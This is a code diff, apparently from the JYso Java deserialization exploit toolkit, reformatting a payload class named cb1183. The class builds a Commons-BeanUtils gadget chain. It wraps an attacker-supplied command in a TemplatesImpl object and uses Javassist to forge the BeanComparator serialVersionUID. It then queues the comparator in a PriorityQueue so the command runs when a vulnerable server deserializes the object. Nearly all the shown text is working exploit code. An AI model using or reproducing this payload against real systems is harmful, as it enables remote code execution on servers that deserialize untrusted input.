@@ -9,7 +9,6 @@ import org.apache.commons.beanutils.BeanComparator;
 
 import java.util.PriorityQueue;
 
-
 import static com.qi4l.JYso.gadgets.utils.InjShell.insertField;
 
 @Dependencies({"commons-beanutils:commons-beanutils:1.8.3", "commons-beanutils:commons-beanutils:1.7X"})
@@ -19,14 +18,14 @@ public class cb1183 implements ObjectPayload<Object> {
     public Object getObject(String command) throws Exception {
         final Object template;
         template = Gadgets.createTemplatesImpl(command);
-        ClassPool pool    = ClassPool.getDefault();
-        CtClass   ctClass = pool.get("org.apache.commons.beanutils.BeanComparator");
+        ClassPool pool = ClassPool.getDefault();
+        CtClass ctClass = pool.get("org.apache.commons.beanutils.BeanComparator");
 
         insertField(ctClass, "serialVersionUID", "private static final long serialVersionUID = -3490850999041592962L;");
 
-        Class                       beanCompareClazz = ctClass.toClass();
-        BeanComparator              comparator       = (BeanComparator) beanCompareClazz.newInstance();
-        final PriorityQueue<Object> queue            = new PriorityQueue<Object>(2, comparator);
+        Class<?> beanCompareClazz = ctClass.toClass();
+        BeanComparator comparator = (BeanComparator) beanCompareClazz.newInstance();
+        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
         queue.add("1");
         queue.add("1");
 
